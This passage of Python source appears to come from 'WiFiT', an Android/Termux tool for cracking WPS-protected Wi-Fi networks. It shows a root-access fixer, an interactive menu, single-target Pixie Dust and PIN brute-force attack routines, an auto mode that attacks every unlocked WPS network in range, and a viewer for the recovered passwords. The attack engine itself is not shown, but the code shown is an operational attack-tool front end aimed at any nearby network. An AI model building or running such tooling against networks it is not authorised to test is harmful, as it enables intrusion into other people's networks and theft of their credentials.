    def fix_root_issues(self):
        """Fix root access issues - Option 6"""
        print("\n\033[1;36m╔══════════════════════════════════════════════════════════════╗")
        print("║                   🔧 ROOT ISSUE FIXER                       ║")
        print("╚══════════════════════════════════════════════════════════════╝\033[0m\n")
        
        print("\033[1;33m[*] Starting root issue diagnosis and repair...\033[0m\n")
        
        issues_fixed = 0
        
        # Step 1: Check current root status
        print("\033[1;36m[1/5]\033[0m Checking current root status...")
        if check_root():
            print("      \033[1;32m✓ Already running as root\033[0m")
        else:
            print("      \033[1;31m✗ Not running as root\033[0m")
        
        # Step 2: Remove conflicting tsu packages
        print("\n\033[1;36m[2/5]\033[0m Removing conflicting tsu packages...")
        try:
            result = subprocess.run("pkg uninstall tsu -y", shell=True, capture_output=True, text=True, timeout=30)
            if result.returncode == 0:
                print("      \033[1;32m✓ Removed old tsu package\033[0m")
                issues_fixed += 1
            else:
                print("      \033[1;33m! No conflicting tsu found\033[0m")
        except Exception as e:
            print(f"      \033[1;33m! Could not remove tsu: {e}\033[0m")
        
        # Step 3: Install/reinstall required packages
        print("\n\033[1;36m[3/5]\033[0m Installing required root packages...")
        packages = ['tsu', 'root-repo']
        for pkg in packages:
            try:
                print(f"      Installing {pkg}...")
                result = subprocess.run(f"pkg install {pkg} -y", shell=True, capture_output=True, text=True, timeout=60)
                if result.returncode == 0:
                    print(f"      \033[1;32m✓ Installed {pkg}\033[0m")
                    issues_fixed += 1
                else:
                    print(f"      \033[1;33m! {pkg} already installed or unavailable\033[0m")
            except Exception as e:
                print(f"      \033[1;31m✗ Failed to install {pkg}: {e}\033[0m")
        
        # Step 4: Scan for su binary
        print("\n\033[1;36m[4/5]\033[0m Scanning for superuser binary...")
        su_paths = [
            '/system/bin/su',
            '/system/xbin/su',
            '/su/bin/su',
            '/sbin/su',
            '/data/local/xbin/su',
            '/data/local/bin/su',
            '/system/sd/xbin/su',
            '/system/bin/failsafe/su',
            '/data/adb/magisk/busybox',
            '/data/adb/ksu/bin/su',
            '/data/adb/ap/bin/su',
        ]
        
        found_su = []
        for path in su_paths:
            if os.path.exists(path):
                found_su.append(path)
                print(f"      \033[1;32m✓ Found: {path}\033[0m")
        
        if found_su:
            print(f"\n      \033[1;32m✓ Found {len(found_su)} superuser binaries\033[0m")
            issues_fixed += 1
        else:
            print("      \033[1;31m✗ No superuser binary found!\033[0m")
            print("      \033[1;33m! Please install Magisk or KernelSU\033[0m")
        
        # Step 5: Test root access
        print("\n\033[1;36m[5/5]\033[0m Testing root access...")
        prefix = os.environ.get('PREFIX') or '/data/data/com.termux/files/usr'
        tsu_path = shutil.which('tsu')
        sudo_path = (os.path.join(os.path.dirname(tsu_path), 'sudo')
                     if tsu_path else os.path.join(prefix, 'bin', 'sudo'))
        id_path = shutil.which('id') or 'id'
        su_path = shutil.which('su')
        test_commands = []
        if os.path.isfile(sudo_path) and os.access(sudo_path, os.X_OK):
            test_commands.append(('sudo', [sudo_path, id_path]))
        if su_path:
            test_commands.append(('su', [su_path, '-c', 'id']))
        root_works = False

        for method, command in test_commands:
            try:
                result = subprocess.run(
                    command, capture_output=True, text=True, timeout=10)
                if 'uid=0' in result.stdout:
                    print(f"      \033[1;32m✓ Root access works with: {method}\033[0m")
                    root_works = True
                    issues_fixed += 1
                    break
            except:
                continue
        
        if not root_works:
            print("      \033[1;31m✗ Root access test failed\033[0m")
        
        # Summary
        print("\n" + "─" * 64)
        print("\n\033[1;36m📊 REPAIR SUMMARY\033[0m")
        print(f"   Issues Fixed: \033[1;32m{issues_fixed}/5\033[0m")
        
        if root_works:
            print("\n\033[1;32m✓ Root access is working!\033[0m")
            print("\033[1;33m[*] Restart WiFiT to use root features\033[0m")
        else:
            print("\n\033[1;31m✗ Root access still not working\033[0m")
            print("\n\033[1;33mTroubleshooting steps:\033[0m")
            print("  1. Install Magisk: https://github.com/topjohnwu/Magisk")
            print("  2. Or install KernelSU: https://kernelsu.org")
            print("  3. Reinstall tsu: pkg install --reinstall tsu")
            print("  4. Run: wifit")
            print("  5. Grant the root permission prompt")
        
        input("\n\033[1;36mPress Enter to continue...\033[0m")
    
    def show_wifi_networks(self, attack_mode="pixie"):
        """Show networks and attack selected one"""
        while True:
            scanner = WiFiScanner(self.interface)
            networks = scanner.iw_scanner()
            
            if not networks:
                print('[-] No WPS networks found')
                retry = input('\n\033[1;33m[?] Press Enter to retry or "q" to quit: \033[0m').strip().lower()
                if retry == 'q':
                    return
                continue
            
            while True:
                try:
                    choice = input("\n\033[1;36m[?] Select network number (or 'r' to rescan, 'q' to quit): \033[0m").strip()
                    if choice.lower() == 'q':
                        return
                    if choice.lower() == 'r':
                        break  # Break inner loop to rescan
                    
                    network_num = int(choice)
                    if network_num in networks:
                        selected = networks[network_num]
                        self._attack_network(selected, attack_mode)
                        return
                    else:
                        print('[-] Invalid selection. Please try again.')
                except ValueError:
                    print('[-] Please enter a valid number, "r" to rescan, or "q" to quit')
                except KeyboardInterrupt:
                    print("\n[!] Operation cancelled")
                    return
    
    def _attack_network(self, network, attack_mode):
        """Attack selected network"""
        bssid = network['BSSID']
        essid = network['ESSID']
        
        print(f"\n\033[1;32m[*] Target: {essid} ({bssid})\033[0m")
        print(f"[*] Attack mode: {attack_mode}")
        print()
        
        companion = Companion(self.interface, save_result=True)
        
        start_time = time.time()
        success = False
        
        try:
            if attack_mode == "pixie":
                success = companion.single_connection(bssid, pixiemode=True)
            elif attack_mode == "bruteforce":
                success = companion.smart_bruteforce(bssid)
            elif attack_mode == "smart":
                # Try pixie first, then bruteforce
                success = companion.single_connection(bssid, pixiemode=True)
                if not success:
                    print("\n[*] Pixie Dust failed, trying brute force...")
                    success = companion.smart_bruteforce(bssid, delay=0.5)
        except KeyboardInterrupt:
            print("\n[!] Attack interrupted by user")
        finally:
            companion.cleanup()
        
        elapsed = time.time() - start_time
        
        print()
        if success:
            print(f"\033[1;32m[+] Attack successful in {elapsed:.1f} seconds!\033[0m")
        else:
            print(f"\033[1;31m[-] Attack failed after {elapsed:.1f} seconds\033[0m")
        
        input('\nPress Enter to continue...')
    
    def auto_attack_all(self):
        """Auto attack all WPS networks"""
        print("\n\033[1;33m[*] Starting Auto Attack Mode...\033[0m")
        print("[*] Scanning for WPS networks...")
        
        scanner = WiFiScanner(self.interface)
        networks = scanner.iw_scanner()
        
        if not networks:
            print('[-] No WPS networks found')
            retry = input('\n\033[1;33m[?] Press Enter to retry or "q" to quit: \033[0m').strip().lower()
            if retry != 'q':
                return self.auto_attack_all()
            return
        
        total = len(networks)
        successful = 0
        failed = 0
        
        print(f"\n[*] Found {total} WPS networks")
        print("[*] Starting attacks with 30-second timeout per target...\n")
        
        for i, (num, network) in enumerate(networks.items(), 1):
            bssid = network['BSSID']
            essid = network['ESSID']
            
            if network['WPS locked']:
                print(f"[{i}/{total}] ⏭️  Skipping {essid} (WPS locked)")
                continue
            
            print(f"\n[{i}/{total}] 🎯 Attacking: {essid} ({bssid})")
            
            companion = Companion(self.interface, save_result=True)
            
            try:
                # Try pixie dust first (fast)
                success = companion.single_connection(bssid, pixiemode=True)
                
                if success:
                    successful += 1
                    print(f"\033[1;32m[+] ✅ Success!\033[0m")
                else:
                    failed += 1
                    print(f"\033[1;31m[-] ❌ Failed\033[0m")
            except KeyboardInterrupt:
                print("\n[!] Auto attack interrupted")
                break
            finally:
                companion.cleanup()
            
            if i < total:
                time.sleep(2)
        
        # Summary
        print("\n" + "="*60)
        print("\033[1;36m🎯 AUTO ATTACK SUMMARY\033[0m")
        print("="*60)
        print(f"✅ Successful: {successful}")
        print(f"❌ Failed: {failed}")
        print(f"📈 Success Rate: {(successful/max(total,1))*100:.1f}%")
        print("="*60)
        
        input('\nPress Enter to continue...')
    
    def view_saved_passwords(self):
        """View all saved passwords"""
        print("\n\033[1;36m╔══════════════════════════════════════════════════════════════╗")
        print("║                   📋 SAVED PASSWORDS                        ║")
        print("╚══════════════════════════════════════════════════════════════╝\033[0m\n")
        
        reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
        txt_file = reports_dir + 'WiFiT_Results.txt'
        csv_file = reports_dir + 'stored.csv'
        
        found_any = False
        
        if os.path.exists(txt_file):
            found_any = True
            print(f"\033[1;32m[+] Results File: {txt_file}\033[0m")
            try:
                with open(txt_file, 'r', encoding='utf-8') as f:
                    content = f.read()
                    if content.strip():
                        print(content[-2000:])  # Show last 2000 chars
                    else:
                        print("    📝 File is empty")
            except Exception as e:
                print(f"    ❌ Error: {e}")
        
        if os.path.exists(csv_file):
            found_any = True
            print(f"\n\033[1;32m[+] CSV File: {csv_file}\033[0m")
            try:
                with open(csv_file, 'r', encoding='utf-8') as f:
                    lines = f.readlines()
                    if len(lines) > 1:
                        print(f"    📋 Total entries: {len(lines)-1}")
                        print("\n    🔍 Recent entries:")
                        for line in lines[-5:]:
                            print(f"    {line.strip()}")
                    else:
                        print("    📝 No entries yet")
            except Exception as e:
                print(f"    ❌ Error: {e}")
        
        if not found_any:
            print("[-] No saved passwords found")
            print("[*] Attack some networks first!")
        
        input("\n\nPress Enter to continue...")
    
    def run_menu(self):
        """Main menu loop"""
        while True:
            os.system('clear' if os.name == 'posix' else 'cls')
            show_wifit_banner()
            show_main_menu()
            
            try:
                choice = input("\n\033[1;36m[?] Select option (1-7): \033[0m").strip()
                
                if choice == "1":
                    self.auto_attack_all()
                elif choice == "2":
                    self.show_wifi_networks("pixie")
                elif choice == "3":
                    self.show_wifi_networks("bruteforce")
                elif choice == "4":
                    self.show_wifi_networks("smart")
                elif choice == "5":
                    self.view_saved_passwords()
                elif choice == "6":
                    self.fix_root_issues()
                elif choice == "7":
                    print("\n\033[1;32m[*] Thank you for using WiFiT!\033[0m")
                    print("[*] Author: TuHiN")
                    print("[*] GitHub: https://github.com/TuHiN22/WiFiT")
                    break
                else:
                    print("[-] Invalid option")
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\n\n[*] Goodbye!")
                break
            except Exception as e:
                print(f"[-] Error: {e}")
                time.sleep(2)


def main():
    """Main entry point"""
    if sys.hexversion < 0x03060F0:
        print("[-] This program requires Python 3.6 or higher")
        sys.exit(1)
    
    # Check and get root access automatically
    if not check_root():
        if not get_root_access():
            print("\n\033[1;33m[!] WiFiT requires root access to function properly\033[0m")
            print("\033[1;33m[!] Please grant root permission or use Option 6 to fix issues\033[0m")
            # Allow to continue to menu for Option 6
    
    # Run menu system
    menu = MenuHandler()
    menu.run_menu()


if __name__ == '__main__':
    main()
